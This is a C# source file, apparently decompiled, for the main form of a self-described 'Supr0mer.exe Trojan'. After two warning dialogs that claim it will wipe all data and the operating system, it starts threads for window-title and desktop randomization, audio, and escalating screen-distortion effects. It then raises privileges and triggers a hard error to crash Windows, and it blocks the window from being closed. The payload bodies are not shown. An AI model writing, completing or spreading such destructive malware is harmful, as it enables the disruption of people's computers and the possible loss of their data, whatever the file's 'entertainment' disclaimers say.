using System;
using System.ComponentModel;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;

namespace Supr0mer
{
	// Token: 0x02000004 RID: 4
	public partial class Form1 : Form
	{
		// Token: 0x06000008 RID: 8 RVA: 0x00002558 File Offset: 0x00000758
		public Form1()
		{
			this.InitializeComponent();
			if (MessageBox.Show("You are about to run a malware called Supr0mer.exe Trojan.\n\nuse this malware wisely, this will cause full capacity to delete all of your data and your operating system.\n\nBy continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it is highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis.\n\nAre you sure you want to execute this malware?\nyou wont be able to use windows again.", "i wished for Supr0mer.exe wont hurt for Supreme Trojan, but the hsl...", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.No)
			{
				Environment.Exit(0);
			}
			if (MessageBox.Show("THIS IS THE FINAL WARNING.\n\nThis Trojan has a lot of destructive potential. You will lose all of your data if you continue, and the creator will not be responsible for any of the damage caused. This is not meant to be malicious but simply for entertainment and educational purposes.\n\nAre you sure you want to continue? This is your final chance to stop this program from execution.", "Supr0mer.exe - FINAL WARNING", MessageBoxButtons.YesNo, MessageBoxIcon.Exclamation) == DialogResult.No)
			{
				Environment.Exit(0);
			}
			Thread.Sleep(5000);
			new Thread(new ThreadStart(payloads.openTrojan)).Start();
			Thread.Sleep(1000);
			new Thread(new ThreadStart(payloads.Unknownerror)).Start();
			new Thread(new ThreadStart(payloads.randomize_window_titles)).Start();
			new Thread(new ThreadStart(payloads.randomize_desktop)).Start();
			new Thread(new ThreadStart(Beat.player)).Start();
			new Thread(new ThreadStart(GDI.DrawLOLZ)).Start();
			new Thread(new ThreadStart(GDI.Sine)).Start();
			Thread.Sleep(30000);
			new Thread(new ThreadStart(GDI.scroll)).Start();
			new Thread(new ThreadStart(GDI.SRAMD)).Start();
			Thread.Sleep(30000);
			new Thread(new ThreadStart(GDI.color)).Start();
			new Thread(new ThreadStart(GDI.kid)).Start();
			Thread.Sleep(30000);
			new Thread(new ThreadStart(GDI.hi)).Start();
			Thread.Sleep(30000);
			new Thread(new ThreadStart(GDI.circles)).Start();
			new Thread(new ThreadStart(GDI.InvertColor)).Start();
			new Thread(new ThreadStart(GDI.SHAKE)).Start();
			Thread.Sleep(30000);
			new Thread(new ThreadStart(GDI.LSD)).Start();
			Thread.Sleep(30000);
			BSOD.RaisePrivilege();
			BSOD.CauseNtHardError();
		}

		// Token: 0x06000009 RID: 9 RVA: 0x000020A8 File Offset: 0x000002A8
		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			e.Cancel = true;
		}
	}
}
